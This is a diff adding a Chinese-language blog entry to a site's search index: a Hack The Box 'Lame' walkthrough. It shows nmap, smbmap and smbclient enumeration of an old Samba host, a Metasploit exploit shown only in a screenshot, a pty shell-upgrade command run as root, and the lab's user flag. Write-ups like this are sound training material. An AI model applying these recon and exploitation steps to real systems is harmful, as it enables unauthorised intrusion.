@@ -18803,4 +18803,82 @@ requests<span class="token punctuation">.</span>get<span class="token punctuatio
         <tag>踩坑记录</tag>
       </tags>
   </entry>
+  <entry>
+    <title>HTB靶机每周练习系列--Lame</title>
+    <url>/2021/12/15/htb-ba-ji-mei-zhou-lian-xi-xi-lie-lame/</url>
+    <content><![CDATA[<h1 id="HTB靶机每周练习系列–Lame"><a href="#HTB靶机每周练习系列–Lame" class="headerlink" title="HTB靶机每周练习系列–Lame"></a>HTB靶机每周练习系列–Lame</h1><p>目标ip：10.129.197.171</p>
+<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>nmap扫描端口</p>
+<pre><code>➜ sudo nmap -sS -sV 10.129.197.171
+Password:
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-14 16:52 CST
+Nmap scan report for 10.129.197.171
+Host is up (0.44s latency).
+Not shown: 996 filtered ports
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><h2 id="ftp服务"><a href="#ftp服务" class="headerlink" title="ftp服务"></a>ftp服务</h2><p>21端口开着，ftp存在匿名登陆但是没文件，去看一下这个 vsftpd 2.3.4 有没有漏洞</p>
+<p>exp-db搜索一下，发现存在命令执行，msf有可以用的payload，上msf</p>
+<p>不过很遗憾，exp打不成功，可能口子找错了</p>
+<h2 id="smb服务"><a href="#smb服务" class="headerlink" title="smb服务"></a>smb服务</h2><p>之前的扫描没有打印smb服务的详细版本，我们使用 nmap的NSE脚本来进行更详细的信息搜集</p>
+<pre><code>nmap --script smb-enum-shares.nse -p445 10.129.197.171</code></pre><p>不过这里没有扫出来，不知道啥原因</p>
+<p>用 <code>smbmap</code> 看一下smb有没有无需凭据即可访问的共享</p>
+<pre class=" language-bash"><code class="language-bash">└─$ smbmap -H 10.129.197.171
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> IP: 10.129.197.171:445    Name: 10.129.197.171
+        Disk                                                      Permissions    Comment
+    ----                                                      -----------    -------
+    print$                                                NO ACCESS    Printer Drivers
+    tmp                                                   READ, WRITE    oh noes<span class="token operator">!</span>
+    opt                                                   NO ACCESS
+    IPC$                                                  NO ACCESS    IPC Service <span class="token punctuation">(</span>lame server <span class="token punctuation">(</span>Samba 3.0.20-Debian<span class="token punctuation">))</span>
+    ADMIN$                                                NO ACCESS    IPC Service <span class="token punctuation">(</span>lame server <span class="token punctuation">(</span>Samba 3.0.20-Debian<span class="token punctuation">))</span></code></pre>
+<p>同时也得到smb版本<br>使用 <code>smbclient</code> 连接上面的目录看看</p>
+<pre class=" language-bash"><code class="language-bash">└─$ smbclient -N //10.129.197.171/tmp                                                                                                                                                                                                                                                                                     1 ⨯
+protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED</code></pre>
+<p>有这个报错提示，原因是连接的是老版本的smb，安全设置的原因不能连接，通过如下参数就可以了</p>
+<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─$ smbclient -N //10.129.197.171/tmp --option<span class="token operator">=</span><span class="token string">'client min protocol=NT1'</span>                                                                                                                                                                                                                                                130 ⨯
+Anonymous login successful
+Try <span class="token string">"help"</span> to get a list of possible commands.
+smb: \<span class="token operator">></span> <span class="token function">dir</span>
+  <span class="token keyword">.</span>                                   D        0  Tue Dec 14 11:06:49 2021
+  <span class="token punctuation">..</span>                                 DR        0  Sat Oct 31 03:33:58 2020
+  orbit-makis                        DR        0  Tue Dec 14 06:25:32 2021
+  .ICE-unix                          DH        0  Tue Dec 14 03:31:26 2021
+  vmware-root                        DR        0  Tue Dec 14 03:32:31 2021
+  .X11-unix                          DH        0  Tue Dec 14 03:31:50 2021
+  gconfd-makis                       DR        0  Tue Dec 14 06:25:32 2021
+  .X0-lock                           HR       11  Tue Dec 14 03:31:50 2021
+  5565.jsvc_up                        R        0  Tue Dec 14 03:32:37 2021
+  vgauthsvclog.txt.0                  R     1600  Tue Dec 14 03:31:25 2021
+
+        7282168 blocks of size 1024. 5385180 blocks available</code></pre>
+<p>没有有用的文件，那就是smb的洞了，毕竟也是很老的版本了</p>
+<p>搜索expdb得知存在rce，msf启动～～</p>
+<h2 id="攻击smb，获取shell"><a href="#攻击smb，获取shell" class="headerlink" title="攻击smb，获取shell"></a>攻击smb，获取shell</h2><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/HTB/Lame/16394989002704.jpg" alt="msf"></p>
+<p>获取到user flag</p>
+<pre class=" language-bash"><code class="language-bash">python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
+root@lame:/home<span class="token comment" spellcheck="true"># ls</span>
+<span class="token function">ls</span>
+<span class="token function">ftp</span>  makis  <span class="token function">service</span>  user
+root@lame:/home<span class="token comment" spellcheck="true"># ls makis</span>
+<span class="token function">ls</span> makis
+user.txt
+root@lame:/home<span class="token comment" spellcheck="true"># cat makis/user.txt</span>
+<span class="token function">cat</span> makis/user.txt
+848890f49b5bd224150c98682a7e8ec3</code></pre>
+<p>root的也一并拿了<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/HTB/Lame/16394992152056.jpg" alt="flag"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>比之前的要简单不少，下一个靶机开始打中等的了</p>
+]]></content>
+      <categories>
+        <category>靶机</category>
+      </categories>
+      <tags>
+        <tag>WriteUp</tag>
+        <tag>靶机</tag>
+        <tag>HTB</tag>
+      </tags>
+  </entry>
 </search>
